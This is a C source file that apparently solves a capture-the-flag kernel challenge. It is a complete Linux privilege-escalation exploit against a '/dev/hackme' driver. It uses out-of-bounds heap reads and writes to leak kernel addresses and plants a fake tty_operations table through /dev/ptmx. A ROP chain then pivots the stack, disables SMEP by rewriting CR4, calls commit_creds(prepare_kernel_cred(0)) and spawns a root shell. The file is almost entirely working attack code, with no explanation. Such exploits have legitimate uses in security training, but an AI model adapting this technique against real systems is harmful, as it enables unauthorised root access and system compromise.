#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

size_t vmlinux_base, off, commit_creds, prepare_kernel_cred;
size_t user_cs, user_ss, user_sp, user_rflags;
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t rop[0x100] = {0};

int fd;

struct Heap{
    size_t index;
    char *data;
    size_t len;
    size_t offset;
};

void add(int index, size_t len, char *data)
{
	struct Heap heap;
	heap.index = index;
	heap.data = data;
	heap.len = len;
	ioctl(fd, 0x30000, &heap);
}

void delete(int index)
{
	struct Heap heap;
	heap.index = index;
	ioctl(fd, 0x30001, &heap);
}

void edit(int index, size_t len, size_t offset, char *data)
{
	struct Heap heap;
	heap.index = index;
	heap.data = data;
	heap.len = len;
	heap.offset = offset;
	ioctl(fd, 0x30002, &heap);
}

void show(int index, size_t len, size_t offset, char *data)
{
	struct Heap heap;
	heap.index = index;
	heap.data = data;
	heap.len = len;
	heap.offset = offset;
	ioctl(fd, 0x30003, &heap);
}


void save_status()
{
	__asm__(
	"mov user_cs, cs;"
	"mov user_ss, ss;"
	"mov user_sp, rsp;"
	"pushf;"
	"pop user_rflags;"
	);
	puts("[+] save the state success!");
}

void get_shell()
{
	if (getuid() == 0)
	{
		puts("[*] get root");
		system("/bin/sh");
	}
	else
	{
		puts("[-] get root error");
		sleep(3);
		exit(0);
	}
}

void get_root()
{
	//commit_creds(prepare_kernel_cred(0))
	void *(*pkc)(int) = (void *(*)(int))prepare_kernel_cred;
	void (*cc)(void *) = (void (*)(void *))commit_creds;
	(*cc)((*pkc)(0));
}


int main()
{
	save_status();

	char buf[0x1000] = {0};
	size_t fake_tty_struct[4] = {0};
	size_t fake_tty_operations[35] = {0};

	fd = open("/dev/hackme",0);
	if(fd < 0)
	{
		puts("[-] open file error");
		sleep(3);
		exit(0);
	}

	add(0, 0x2e0, buf); // 0
	add(1, 0x2e0, buf); // 1
	add(2, 0x100, buf); // 2
	add(3, 0x100, buf); // 3
	delete(0);
	delete(2);

	show(3, 0x100, -0x100, buf);
	size_t heap_addr = ((size_t *)buf)[0] - 0x200;
	printf("[+] heap_addr=> 0x%lx\n", heap_addr);
	
	int fd_tty = open("/dev/ptmx",O_RDWR | O_NOCTTY);
	if(fd_tty < 0)
	{
		puts("[-] open ptmx error");
		sleep(3);
		exit(0);
	}
	
	show(1, 0x400, -0x400, buf);
	vmlinux_base = ((size_t *)buf)[3] - 0x625d80;
	printf("[+] vmlinux_base=> 0x%lx\n", vmlinux_base);
	off = vmlinux_base - raw_vmlinux_base;
	commit_creds = off + 0xffffffff8104d220;
	prepare_kernel_cred = off + 0xffffffff8104d3d0;

	int i = 0;
	rop[i++] = off + 0xffffffff8101b5a1; // pop rax; ret;
	rop[i++] = 0x6f0;
	rop[i++] = off + 0xffffffff8100252b; // mov cr4, rax; push rcx; popfq; pop rbp; ret;
	rop[i++] = 0;
	rop[i++] = (size_t)get_root;
	rop[i++] = off + 0xffffffff81200c2e; // swapgs; popfq; pop rbp; ret; 
	rop[i++] = 0;
	rop[i++] = 0;
	rop[i++] = off + 0xffffffff81019356; // iretq; pop rbp; ret;
	rop[i++] = (size_t)get_shell;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;
	
	add(2, 0x100, (char *)rop);
	
	fake_tty_operations[7] = off + 0xffffffff810608d5; // push rax; pop rsp; ret;

	fake_tty_operations[0] = off + 0xffffffff810484f0; // pop rsp; ret;
	fake_tty_operations[1] = heap_addr;

	((size_t *)buf)[3] = heap_addr + 0x100;
	
	delete(3);
	add(3, 0x100, (char *)fake_tty_operations);

	edit(1, 0x400, -0x400, buf);

	write(fd_tty, "FXC", 3);
	return 0;
}
